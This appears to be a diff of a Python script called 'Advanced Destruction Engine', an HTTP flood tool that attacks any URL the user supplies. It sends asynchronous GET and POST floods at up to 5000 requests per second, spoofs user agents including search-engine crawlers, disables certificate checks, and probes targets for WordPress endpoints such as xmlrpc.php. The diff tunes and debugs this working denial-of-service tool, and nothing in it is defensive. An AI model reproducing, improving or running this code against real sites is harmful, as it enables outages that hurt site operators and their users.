@@ -20,8 +20,13 @@ import aiohttp
 import ssl
 import urllib.parse
 import json
+import warnings
+import urllib3
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# Disable all warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+warnings.filterwarnings("ignore")
 
 # Rich imports
 from rich.console import Console
@@ -41,11 +46,16 @@ import colorama
 colorama.init(autoreset=True)
 console = Console()
 
+# SSL context for ignoring certificate warnings
+ssl_context = ssl.create_default_context()
+ssl_context.check_hostname = False
+ssl_context.verify_mode = ssl.CERT_NONE
+
 # ==================== GLOBAL CONFIGURATION ====================
 class Config:
     # Performance
-    MAX_THREADS = 1000
-    MAX_RPS = 10000
+    MAX_THREADS = 500
+    MAX_RPS = 5000
     CONNECTION_TIMEOUT = 10
     REQUEST_TIMEOUT = 15
     
@@ -59,6 +69,9 @@ class Config:
     PROXY_LIST = []
     ROTATE_USER_AGENT = True
     ROTATE_IP = False
+    
+    # SSL Settings
+    VERIFY_SSL = False
     
     # Monitoring
     LOG_LEVEL = "INFO"
@@ -89,7 +102,7 @@ class AttackState:
     lock = threading.Lock()
     last_count = 0
 
-# Target information
+# ==================== TARGET INFORMATION ====================
 class TargetInfo:
     def __init__(self, url):
         self.url = url
@@ -131,6 +144,9 @@ class TargetInfo:
     def scan(self):
         """Scan target for information"""
         try:
+            # Import requests here to avoid circular import
+            import requests
+            
             # Get server headers
             response = requests.get(self.url, timeout=5, verify=False)
             self.server_info = dict(response.headers)
@@ -169,6 +185,8 @@ class TargetInfo:
     
     def _find_vulnerabilities(self):
         """Find common vulnerabilities"""
+        import requests
+        
         vuln_endpoints = [
             '/xmlrpc.php',
             '/wp-json/wp/v2/users',
@@ -190,6 +208,19 @@ class TargetInfo:
                     self.vulnerabilities.append(endpoint)
             except:
                 continue
+
+# ==================== USER AGENTS ====================
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
+]
 
 # ==================== ADVANCED ATTACK VECTORS ====================
 class AttackVectors:
@@ -226,7 +257,7 @@ class AttackVectors:
             if random.random() > 0.7:
                 headers['Referer'] = f"https://www.google.com/search?q={target.host}"
             
-            async with session.get(url, headers=headers, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as response:
+            async with session.get(url, headers=headers, ssl=ssl_context, timeout=aiohttp.ClientTimeout(total=10)) as response:
                 data = await response.read()
                 
                 with AttackState.lock:
@@ -304,7 +335,7 @@ class AttackVectors:
                 'Connection': 'keep-alive'
             }
             
-            async with session.post(url, data=post_data, headers=headers, ssl=False, 
+            async with session.post(url, data=post_data, headers=headers, ssl=ssl_context, 
                                   timeout=aiohttp.ClientTimeout(total=10)) as response:
                 data = await response.read()
                 
@@ -368,7 +399,7 @@ class AttackManager:
         timeout = aiohttp.ClientTimeout(total=Config.REQUEST_TIMEOUT)
         connector = aiohttp.TCPConnector(
             limit=0,
-            ssl=False,
+            ssl=ssl_context,
             force_close=True,
             enable_cleanup_closed=True
         )
@@ -434,6 +465,7 @@ class AttackManager:
 # ==================== MONITORING & DISPLAY ====================
 class AttackMonitor:
     """Monitor and display attack statistics"""
+    current_target = ""
     
     @staticmethod
     def calculate_stats():
@@ -526,33 +558,21 @@ class AttackMonitor:
                 progress_table.add_column(width=50)
                 
                 # Success rate bar
-                success_bar = "█" * int(stats['success_rate'] / 2) + "░" * (50 - int(stats['success_rate'] / 2))
+                success_bar_length = int(stats['success_rate'] / 2)
+                success_bar = "█" * success_bar_length + "░" * (50 - success_bar_length)
                 progress_table.add_row(f"Success Rate: [{success_bar}] {stats['success_rate']:.1f}%")
                 
                 # RPS progress
                 rps_percent = min(100, (stats['current_rps'] / max(Config.MAX_RPS, 1)) * 100)
-                rps_bar = "█" * int(rps_percent / 2) + "░" * (50 - int(rps_percent / 2))
+                rps_bar_length = int(rps_percent / 2)
+                rps_bar = "█" * rps_bar_length + "░" * (50 - rps_bar_length)
                 progress_table.add_row(f"RPS Usage:   [{rps_bar}] {stats['current_rps']:,}/{Config.MAX_RPS:,}")
                 
                 layout["footer"].update(Panel(progress_table, title="📈 PROGRESS", border_style="bold green"))
                 
                 live.update(layout)
                 time.sleep(0.5)
-
-# ==================== USER AGENTS ====================
-USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
-    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
-]
-
-# ==================== MAIN FUNCTIONS ====================
+                # ==================== MAIN FUNCTIONS ====================
 def show_banner():
     """Display banner"""
     os.system('clear' if os.name == 'posix' else 'cls')
@@ -736,7 +756,7 @@ def main():
         # Run attack
         asyncio.run(run_attack(target_url))
         
-              # Ask for another attack
+        # Ask for another attack
         restart = input("\n👉 Launch another attack? (y/n): ").strip().lower()
         if restart == 'y':
             # Reset stats
@@ -783,42 +803,11 @@ if __name__ == "__main__":
         subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
         import requests
     
-    # Fix syntax errors in the code
-    # Replace incorrect syntax in AttackMonitor.display_dashboard
-    import re
-    
-    # Fix the multiplication syntax issue
-    def fix_code_syntax():
-        """Fix common syntax errors in the code"""
-        # This is a workaround for the string multiplication issue
-        # The actual fix should be in the AttackMonitor.display_dashboard method
-        pass
-    
     try:
-        fix_code_syntax()
         main()
     except KeyboardInterrupt:
         console.print("\n[yellow]👋 Exiting Advanced Destruction Engine...[/]")
         sys.exit(0)
-    except SyntaxError as e:
-        console.print(f"[red]✗ Syntax error in code: {e}[/]")
-        console.print("[yellow]⚠️  Fixing common syntax issues...[/]")
-        
-        # Common fixes
-        if "invalid syntax" in str(e):
-            # Fix string multiplication issue
-            console.print("[green]✓ Applying automatic fixes...[/]")
-            
-            # Create fixed version of problematic lines
-            fixed_code = """
-            # Fix for progress bars in AttackMonitor.display_dashboard
-            success_bar = "█" * int(stats['success_rate'] / 2) + "░" * (50 - int(stats['success_rate'] / 2))
-            rps_bar = "█" * int(rps_percent / 2) + "░" * (50 - int(rps_percent / 2))
-            """
-            
-            console.print("[green]✓ Syntax fixes applied. Please run the tool again.[/]")
-            console.print("[yellow]If error persists, check line:[/]", e.lineno)
-            
     except Exception as e:
         console.print(f"[red]✗ Fatal error: {e}[/]")
         console.print("[yellow]Troubleshooting steps:[/]")
